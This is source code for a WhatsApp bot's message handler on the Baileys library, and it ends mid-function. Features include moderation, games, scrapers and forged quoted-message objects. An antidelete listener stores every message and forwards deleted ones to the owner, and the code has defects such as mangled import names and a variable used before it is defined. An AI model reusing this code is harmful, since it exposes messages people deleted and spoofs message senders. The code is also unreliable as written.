//================= { MODULE } =================\\
require('./tmp/helpers/commandMenu');
require('../settings/config');
const {
    smsg,
    getGroupAdmins,
    formatp,
    tanggal,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    jsonformat,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    reSize
} = require('./lib/myfunction');
const { pinterest, pinterest2, remini, mediafire, } = require('./lib/scraper');

//================= { PREMIUM MODULE } =================\\
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredCheck,
    checkPremiumUser,
    getAllPremiumUser
} = require('./lib/premium');

//================= { BAILEYS MODULE } =================\\
const {
    makeWASocket,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReRaolLatestXectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisRaolLatestXectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    templateMessage
} = require('@whiskeysockets/baileys');
//================= { MODULE } =================\\
const axios = require('axios')
const os = require('os')
const fs = require('fs')
const util = require('util')
const fetch = require('node-fetch')
const nou = require("node-os-utils");
const {
   crypto
} = require('crypto')
const speed = require('performance-now')
const moment = require('moment-timezone')
const api = require('api-dylux')
const yts = require('yt-search');
const { lookup } = require('mime-types')
const cheerio = require('cheerio')
const {
    spawn: spawn,
    exec, execSync
} = require('child_process')
const {
    Primbon
} = require('scrape-primbon')
const primbon = new Primbon()
const {
    performance
} = require('perf_hooks')
const { fromBuffer } = require('file-type');
const BodyForm = require('form-data');
const FormData = require("form-data");
const googleTTS = require('google-tts-api');
const path = require('path')
const ytdl = require('@vreden/youtube_scraper');
const { igdl } = require('btch-downloader');
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const { LoadDataBase } = require('./message');
const {
    getFileFromGithub,
    updateFileOnGithub
} = require("./lib/github")
const {
    toPTT,
    toAudio
} = require("./lib/converter")
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");


//================= { GITHUB } =================\\
const githubOwner = '';
const githubRepo = '';
const githubFilePath = '';
const githubAccessToken = '';

//================= { CUSTOM LIBRARY } =================\\
const _cmd = JSON.parse(fs.readFileSync('./start/lib/database/command.json'));
const _cmdUser = JSON.parse(fs.readFileSync('./start/lib/database/commandUser.json'));
const {
    addCountCmd,
    getPosiCmdUser,
    addCountCmdUser
} = require('./tmp/helpers/command')
const pendaftar = JSON.parse(fs.readFileSync('./start/lib/database/userNumber.json'));
const userPrem = JSON.parse(fs.readFileSync('./start/lib/database/userPremium.json'))
const contacts = JSON.parse(fs.readFileSync("./start/lib/database/contacts.json"))

//================= { BASE } =================\\
module.exports = ednut = async (ednut, m, chatUpdate, store) => {
await LoadDataBase(ednut, m)
    try {
        var body = (
            (m.mtype === 'conversation') ? m.message?.conversation :
            (m.mtype === 'imageMessage') ? m.message?.imageMessage?.caption :
            (m.mtype === 'videoMessage') ? m.message?.videoMessage?.caption :
            (m.mtype === 'extendedTextMessage') ? m.message?.extendedTextMessage?.text :
            (m.mtype === 'buttonsResponseMessage') ? m.message?.buttonsResponseMessage?.selectedButtonId :
            (m.mtype === 'listResponseMessage') ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
            (m.mtype === 'templateButtonReplyMessage') ? m.message?.templateButtonReplyMessage?.selectedId :
            (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
            (m.mtype === 'messageContextInfo') ? (
                m.message?.buttonsResponseMessage?.selectedButtonId ||
                m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
                m.text
            ) : ''
        ) || '';
        var budy = (typeof m.text === 'string' ? m.text : '');
        
        const isUser = pendaftar.includes(m.sender);
        const prefix = global.prefix;
        const isCmd = body.startsWith(prefix);
        const isCmd2 = !body.startsWith(prefix);
        const xeonybody = body.startsWith(prefix);         const command = xeonybody ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : "";
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const fatkuns = (m.quoted || m);
        const quoted = (fatkuns.mtype === 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : 
            (fatkuns.mtype === 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : 
            (fatkuns.mtype === 'product') ? fatkuns[Object.keys(fatkuns)[0]] : 
            m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        //================= { USER } =================\\
     const botNumber = await ednut.decodeJid(ednut.user.id);
        const globalelit = `2347036214381@s.whatsapp.net`;
        const setsudo = JSON.parse(fs.readFileSync("./start/lib/database/owner.json"))
        const isSetsudo = setsudo.includes(m.sender)
        const isOwner  = globalelit.includes(m.sender);
        const itsMe = m.sender === botNumber ? true : false;
        const isCreator = [botNumber, ...global.owner, ...setsudo].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        //================= { GROUP } =================\\
        const groupMetadata = m.isGroup ? await ednut.groupMetadata(m.chat).catch(() => null) : null;
        const groupName = groupMetadata?.subject || '';
        const participants = m.isGroup ? (groupMetadata?.participants || []) : [];
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : '';
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
        const groupOwner = m.isGroup ? groupMetadata?.owner : '';
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false;
        //================= { ACCESS } =================\\
        // Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: global.prefix + text, mentions: m.mentionedJid }, {
    userJid: ednut.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, ednut.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
ednut.ev.emit('messages.upsert', msg)
} 

async function downloadMedia(message, messageType) {
    try {
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        return buffer;
    } catch (error) {
        console.error("❌ Error downloading media:", error);
        return null;
    }
}

//game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                m.reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) ednut.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            ednut.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }

        //================= { REACT } =================\\
        const moji = ['📚', '💭', '💫', '🌌', '🌏', '✨', '🌷', '🍁', '🪻', ]
        const randomemoji = moji[Math.floor(Math.random() * moji.length)]

        //================= { PREMIUM } =================\\
        const isPremium = global.db.users[m.sender]. premium === true
        const isLimit = global.db.users[m.sender].limit === 0

        //================= { TIME } =================\\
        const moment = require('moment-timezone')
        const time2 = moment().tz(`${global.timezone}`).format("HH:mm:ss")
        let ucapanWaktu;

        if (time2 < "03:00:00") {
            ucapanWaktu = "Good night🌃"
        } else if (time2 < "06:00:00") {
            ucapanWaktu = "Enjoy nap🌆"
        } else if (time2 < "11:00:00") {
            ucapanWaktu = "Good morning🏙️"
        } else if (time2 < "15:00:00") {
            ucapanWaktu = "Good afternoon🏞️"
        } else if (time2 < "19:00:00") {
            ucapanWaktu = "Good afternoon🌄"
        } else {
            ucapanWaktu = "Good evening🌃"
        }
        const wib = moment(Date.now()).tz(`${global.timezone}`).locale("ng").format("HH:mm:ss z")
        const wita = moment(Date.now()).tz(`${global.timezone}`).locale("ng").format("HH:mm:ss z")
        const wit = moment(Date.now()).tz(`${global.timezone}`).locale("ng").format("HH:mm:ss z")
        const salam2 = moment(Date.now()).tz(`${global.timezone}`).locale("ng").format("a")

        //================= { STATUS } =================\\

        if (!ednut.public) {
            if (!m.key.fromMe) return
        }

        //================= {  } =================\\
        
        
        const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}

if (global.db.settings.autobio) {
            ednut.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }


        // Grup Only
        if (!m.isGroup && !isCreator && !isSetsudo && global.db.settings.onlygroup) {
        	if (isCmd){
            return m.reply(`${global.onlygroup}`)
            }
        }
        // Private Only
        if (!isCreator && !isSetsudo && global.db.settings.onlypc && m.isGroup) {
        	if (isCmd){
	         return m.reply(`${global.onlypc}`)
	     }
	}
	
	
        
function notifier(deletedMessage) {
    const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;

    const timeNow = new Intl.DateTimeFormat('en-KE', {
        timeZone: `${global.timezone}`,
        dateStyle: 'full',
        timeStyle: 'medium',
    }).format(new Date());

    let notification = `*[ Deleted message DETECTED ]*\n`;
    notification += `*Time:* ${timeNow}\n`;
    notification += `*By:* @${deletedBy.split('@')[0]}\n`;

    return notification;
}

ednut.ev.on("messages.upsert", async (m) => {
    if (global.db.settings.antidelete) {
        const { messages } = m;
        const ms = messages[0];
        if (!ms.message) return;

        const messageKey = ms.key;
        const remoteJid = messageKey.remoteJid;
        // Store message for future reference
        if (!store.chats[remoteJid]) {
            store.chats[remoteJid] = [];
        }
        store.chats[remoteJid].push(ms);

        // Handle deleted messages
        if (ms.message.protocolMessage && ms.message.protocolMessage.type === 0) {
            const deletedKey = ms.message.protocolMessage.key;
            const chatMessages = store.chats[remoteJid];
            const deletedMessage = chatMessages.find(
                (msg) => msg.key.id === deletedKey.id
            );
                    const rep = {
    key: {
        remoteJid: 'status@broadcast',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: `120363322606369079@newsletter`,
        newsletterName: `Ednut`,
        jpegThumbnail:  null,
        caption: `Deleted Message`,
        inviteExpiration: Date.now() + 1814400000
      }
    }
};

            if (deletedMessage) {
                try {
                    const notification = notifier(deletedMessage)
                    // Determine message type
                    const mtype = Object.keys(deletedMessage.message)[0];

                    // Handle text messages (conversation or extendedTextMessage)
                    if (mtype === 'conversation' || mtype === 'extendedTextMessage') {
                        await ednut.sendMessage(ednut.user.id, {
                            text: notification + `*Message:* ${deletedMessage.message[mtype].text}\n\n> ${botname}.`,
                            mentions: [deletedMessage.key.participant]
                        });
                    }
                    // Handle media messages (image, video, document, audio, sticker, voice)
                    else {
                       const antideletedMsg = JSON.parse(JSON.stringify(deletedMessage.message));
        const messageType = Object.keys(antideletedMsg)[0];
        if (antideletedMsg[messageType]) {
                antideletedMsg[messageType].contextInfo = {
                        stanzaId: deletedMessage.key.id,
                        participant: deletedMessage.sender,
                        quotedMessage: deletedMessage.message,
                };
        }

      await ednut.relayMessage(ednut.user.id, antideletedMsg, {});
      await ednut.sendMessage(ednut.user.id, {
                            text: notification,
                            mentions: [deletedMessage.key.participant]
                        }, { quoted: m });
                    }
                } catch (error) {
                    console.error('Error handling deleted message:', error);
                }
            }
        }
    }
});


let pp
try {
pp = await ednut.profilePictureUrl(m.sender, 'image')
} catch (err) {
pp = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function webp2mp4File(path) {
	return new Promise((resolve, reject) => {
		 const form = new BodyForm()
		 form.append('new-image-url', '')
		 form.append('new-image', fs.createReadStream(path))
		 axios({
			  method: 'post',
			  url: 'https://s6.ezgif.com/webp-to-mp4',
			  data: form,
			  headers: {
				   'Content-Type': `multipart/form-data; boundary=${form._boundary}`
			  }
		 }).then(({ data }) => {
			  const bodyFormThen = new BodyForm()
			  const $ = cheerio.load(data)
			  const file = $('input[name="file"]').attr('value')
			  bodyFormThen.append('file', file)
			  bodyFormThen.append('convert', "Convert WebP to MP4!")
			  axios({
				   method: 'post',
				   url: 'https://ezgif.com/webp-to-mp4/' + file,
				   data: bodyFormThen,
				   headers: {
						'Content-Type': `multipart/form-data; boundary=${bodyFormThen._boundary}`
				   }
			  }).then(({ data }) => {
				   const $ = cheerio.load(data)
				   const result = 'https:' + $('div#output > p.outfile > video > source').attr('src')
				   resolve({
						status: true,
						message: "© ᴀʀᴄʜ ᴍᴅ ²⁵",
						result: result
				   })
			  }).catch(reject)
		 }).catch(reject)
	})
}

async function tmpfiles(buffer) {
  const { ext, mime } = (await fromBuffer(buffer)) || {};
  const form = new BodyForm();
  form.append("file", buffer, { filename: `tmp.${ext}`, contentType: mime });
  try {
    const { data } = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });   
    //console.log(data);  
    const match = /https?:\/\/tmpfiles.org\/(.*)/.exec(data.data.url);
    return `https://tmpfiles.org/dl/${match[1]}`;
  } catch (error) {
    throw error;
  }
}



const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url || 
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url ||
            m.message.stickerMessage?.url ||
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url ||
            m.message.audioMessage?.url ||
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude ||
            m.message.pollCreationMessage?.name ||
            '';
            
// antitag function

if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antitag) {
if (m.mentionedJid.length > 10) {
if (isCreator || isAdmins || m.key.fromMe) return
await m.reply("You will be kicked out of this group for tagging multiple people while anti-tag mode is enabled.")
await ednut.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

        //download status #ctto
if (global.db && global.db.settings && global.db.settings.send)
    if (body.includes('share') || body.includes('Send') || body.includes('send'))  {
   	if (m.quoted?.chat != 'status@broadcast') return 
	let buffer = await m.quoted.download()
	await ednut.sendFile(m.chat, buffer, '', m.quoted.text || '', null, false, { quoted: m }).catch(_ => m.reply(m.quoted.text || ''))
      }
 
// Auto reaction 
if (global.db.settings && global.db.settings.areact2 && isMessage && isCmd2) {
try {
const emojis = ['😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🙀', '😱', '😲', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️', '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️', '🏄‍♂️', '🏄‍♀️', '🚣‍♂️', '🚣‍♀️', '🏊‍♂️', '🏊‍♀️', '🤿‍♂️', '🤿‍♀️', '🎿', '🏂', '🏌️', '🏌️‍♀️', '🏄‍♂️', '🚣‍♀️', '🤹‍♂️', '🤹‍♀️', '🚴‍♀️', '🚴‍♂️', '🏊‍♀️', '🏊‍♂️', '🚣‍♂️', '🚣‍♀️', '🤾‍♀️', '🤾‍♂️', '🏄‍♀️', '🏄‍♂️', '🏊‍♀️', '🏊‍♂️', '🚴‍♂️', '🚴‍♀️', '🏌️', '🏌️‍♀️', '🏂', '🏂‍♀️', '🤺', '🤺‍♀️', '👺', '👻', '🕷️', '🕸️', '👻', '👺', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚂', '🚃', '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝', '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪', '🚫', '🚬', '🚭', '🚮', '🚯', '🚰', '🚱', '🚲', '🚳', '🚴', '🚵', '🚶'];
const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
if (m.key && m.key.remoteJid && m.key.id) {
const randomEmoji = getRandomEmoji();
await ednut.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
} catch (error) {
console.error("Error in AutoReact:", error.message || error);
}
}
 
 
 // mode settings
        if (global.db.settings.mode)
        if (!isCreator && !isSetsudo) {
          if (isCmd) {
            return
          }
        }
        
if (global.db.settings && global.db.settings.areact && isCmd) {
try {
const emojis = ['😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🙀', '😱', '😲', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️', '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️', '🏄‍♂️', '🏄‍♀️', '🚣‍♂️', '🚣‍♀️', '🏊‍♂️', '🏊‍♀️', '🤿‍♂️', '🤿‍♀️', '🎿', '🏂', '🏌️', '🏌️‍♀️', '🏄‍♂️', '🚣‍♀️', '🤹‍♂️', '🤹‍♀️', '🚴‍♀️', '🚴‍♂️', '🏊‍♀️', '🏊‍♂️', '🚣‍♂️', '🚣‍♀️', '🤾‍♀️', '🤾‍♂️', '🏄‍♀️', '🏄‍♂️', '🏊‍♀️', '🏊‍♂️', '🚴‍♂️', '🚴‍♀️', '🏌️', '🏌️‍♀️', '🏂', '🏂‍♀️', '🤺', '🤺‍♀️', '👺', '👻', '🕷️', '🕸️', '👻', '👺', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚂', '🚃', '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝', '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪', '🚫', '🚬', '🚭', '🚮', '🚯', '🚰', '🚱', '🚲', '🚳', '🚴', '🚵', '🚶'];
const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
if (m.key && m.key.remoteJid && m.key.id) {
const randomEmoji = getRandomEmoji();
await ednut.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
} catch (error) {
console.error("Error in AutoReact:", error.message || error);
}
}




// Antilink Kick
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink) {
  if (body.match('http://') || body.match('https://')) {
    if (isCreator || isAdmins || m.key.fromMe) return
    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions')
    await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat,fromMe: false, id: m.key.id,participant: m.key.participant}}) 
    ednut.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} You will be kicked out contact the admin if link was dropped mistakenly`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
    await sleep (3000) //to avoid rate overlimit
    await ednut.groupParticipantsUpdate(m.chat,[m.sender],'remove')
  }
}

// Antilink delete
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink2) {
  if (body.includes("https://")) {
    if (isCreator || isAdmins || m.key.fromMe) return
    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions')
    await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
    ednut.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} admin turned on antilink feature no link will be posted without admin consent`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
  }
}


async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function reply2(teks) {
return ednut.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: pp, title: `${global.botname}`, body: `${runtime(process.uptime())}`, previewType: "PHOTO"}}}, {quoted: m})
}   

        try {
            ppuser = await ednut.profilePictureUrl(m.sender, 'image')
        } catch (err) {
            ppuser = 'https://raw.githubusercontent.com/latesturl/dbCDN/refs/heads/main/my-DB/profile.jpg'
        }
        ppnyauser = await getBuffer(ppuser)

        const reSize = async (buffer, ukur1, ukur2) => {
            return new Promise(async (resolve, reject) => {
                let jimp = require('jimp')
                var baper = await jimp.read(buffer);
                var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
                resolve(ab)
            })
        }
        const fkethmb = await reSize(ppuser, 300, 300)
        let jimp = require("jimp")
        const resize = async (image, width, height) => {
            const read = await jimp.read(image);
            const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
            return data;
        };

        const reaction = async (jidss, emoji) => {
            ednut.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key
                }
            })
        };

        //======================\\

        const fkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': global.botname,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=6287862115557:6287862115557\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
                    'jpegThumbnail': fkethmb,
                    thumbnail: fkethmb,
                    sendEphemeral: true
                }
            }
        }

        const ftroli = {
            key: {
                remoteJid: '6285736178354-1625305606@g.us',
                participant: '0@s.whatsapp.net'
            },
            message: {
                orderMessage: {
                    itemCount: 999,
                    status: 1,
                    thumbnail: fkethmb,
                    surface: 1,
                    message: "ednut",
                    orderTitle: "Activated!",
                    sellerJid: '0@s.whatsapp.net'
                }
            }
        }

        const qevent = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: ""
                } : {})
            },
            'message': {
                "eventMessage": {
                    "isCanceled": false,
                    "name": `${ucapanWaktu}`,
                    "description": "ednut",
                    "location": {
                        "degreesLatitude": 0,
                        "degreesLongitude": 0,
                        "name": "ednut"
                    },
                    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
                    "startTime": "12345678"
                }
            }
        }

        //======================\\
        
        /*
        const reply = (teks) => {
            ednut.sendMessage(m.chat, {
                text: teks
            }, {
                quoted: m
            })
        }
        */
        
        const reply = async (teks) => {
        const RaolLatestXJob = {
        contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
        newsletterName: `${global.footer}`,
        newsletterJid: `120363398150276013@newsletter`,
        },
        },
        text: teks, 
        };
        return ednut.sendMessage(m.chat, RaolLatestXJob, {
        quoted: m, ephemeralExpiration: 99,
        });
        };
        
     const reply4 = async (teks) => {
   ednut.sendMessage(m.chat, {image: {url: `${global.thumb}` }, caption: teks, }, {quoted: m })
}

		if (m.sender.startsWith(`${global.db.settings.autoblock}`) && global.db.settings.autoblocknum === true) {
			return ednut.updateBlockStatus(m.sender, 'block');
		}

const axios = require('axios')
const https = require('https')
const agent = new https.Agent({
    rejectUnauthorized: true,
    maxVersion: 'TLSv1.3',
    minVersion: 'TLSv1.2'
})

async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent })
        const setCookieHeaders = response.headers['set-cookie']
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';')
                return cookieParts[0].trim()
            })
            return cookies.join('; ')
        }
        return null
    } catch {
        return null
    }
}


async function pinterest(query) {
    try {
        const cookies = await getCookies()
        if (!cookies) return []

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/'
        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                options: {
                    isPrefetch: false,
                    query: query,
                    scope: "pins",
